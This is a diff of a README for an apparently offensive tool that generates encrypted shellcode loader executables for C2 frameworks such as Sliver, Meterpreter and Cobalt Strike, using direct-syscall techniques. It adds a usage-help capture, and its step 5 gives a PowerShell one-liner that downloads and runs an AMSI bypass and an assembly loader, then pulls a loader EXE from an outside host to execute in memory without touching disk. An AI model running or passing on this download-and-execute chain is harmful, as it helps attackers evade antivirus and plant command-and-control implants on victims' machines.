@@ -76,7 +76,20 @@ rawscfilename='sliver.bin'
 
 4. Run the autogen script, wait for couple of minutes and check the generated encrypted EXE in the output folder.
 
-5. Since the gneerated EXE are Sharp Assembly, so it can be chained with the tool [PowerSharpLoader](https://github.com/F4l13n5n0w/PowerSharpLoader) to load remotely into memory without touch disk, as shown in the following example:
+```
+┌──(root💀TW-PenTestBox)-[~/myCodes/sn0wldr]
+└─# ./autogen_loader.sh -h                              
+[*] Usage: ./autogen_loader.sh -t <c2type> -a <target_os_arch> -s <syscall_type> 
+[*] Exg..: ./autogen_loader.sh -t sliver -a x64 -s halogate 
+
+[!] Make sure the shellcode bin file located in input folder and named as <c2type>.bin 
+[!] Currently c2type only support the following four: 
+[!] 	sliver|meterpreter|cobaltstrike|covenant 
+[!] Current directly syscall methods only support the following two: 
+[!] 	dinvoke|halogate
+```
+
+5. Since the generated EXE are Sharp Assembly, so it can be chained with the tool [PowerSharpLoader](https://github.com/F4l13n5n0w/PowerSharpLoader) to load remotely into memory without touch disk, as shown in the following example:
 ```
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi3.txt"));IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssembly.ps1"));Invoke-LoadAssembly -AssemblyUrl https://not.o0.rs/halosli64x2.exe -Command ""
 ```
